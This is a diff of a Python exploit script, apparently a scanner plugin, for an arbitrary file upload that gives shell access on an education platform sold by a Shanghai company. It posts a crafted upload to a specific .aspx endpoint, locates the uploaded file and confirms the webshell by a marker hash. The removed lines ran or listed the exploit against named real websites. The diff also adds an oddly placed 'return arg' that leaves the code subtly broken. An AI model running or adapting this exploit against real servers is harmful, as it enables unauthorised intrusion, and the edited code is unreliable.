@@ -1,5 +1,5 @@
 # coding:utf-8
-# title:上海鼎创信息科技有限公司某通用型任意上传导致Getshell 
+# title:上海鼎创信息科技有限公司某通用型任意上传导致Getshell
 # author:codier
 # blog:http://www.codier.cn
 # date:2015-08-10
@@ -64,7 +64,7 @@ def assign(service, arg):
 
 def audit(arg):
     url = arg
-    buff_state = getViewState(url) #get viewstat 
+    buff_state = getViewState(url) #get viewstat
     rawt = com_pack(buff_state)   #get pack
     code, head, res, errcode, _ = curl.curl2(url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx',raw = rawt)
     m = re.search('(\xcc\xe1\xbd\xbb\xb3\xc9\xb9\xa6\xa3\xa1|\xe6\x8f\x90\xe4\xba\xa4\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81)', res)
@@ -73,13 +73,11 @@ def audit(arg):
     code , head, res ,errcode,_ = curl.curl2(url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAll.aspx')
     m = re.search(r"src='\.\./\.\./(.*?)'",res)
     if m :
-    	code ,head ,res,errcode,_ = curl.curl2(url + '/' + m.group(1))
-    	if 'E327B894F7C7782B9A3CE3697556902A' in res:
-    		security_hole('[getshell success] ' + url + '/' + m.group(1))
+        code ,head ,res,errcode,_ = curl.curl2(url + '/' + m.group(1))
+        if 'E327B894F7C7782B9A3CE3697556902A' in res:
+            security_hole('[getshell success] ' + url + '/' + m.group(1))
 
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    #getViewState('http://i.goodo.com.cn/')
-    audit(assign('eduplate', 'http://smxx.ijd.cn/')[1])
-    #audit(assign('EduPlate', 'http://i.goodo.com.cn/')[1])
-    #audit(assign('EduPlate', 'http://www.mhhlyy.com/')[1])
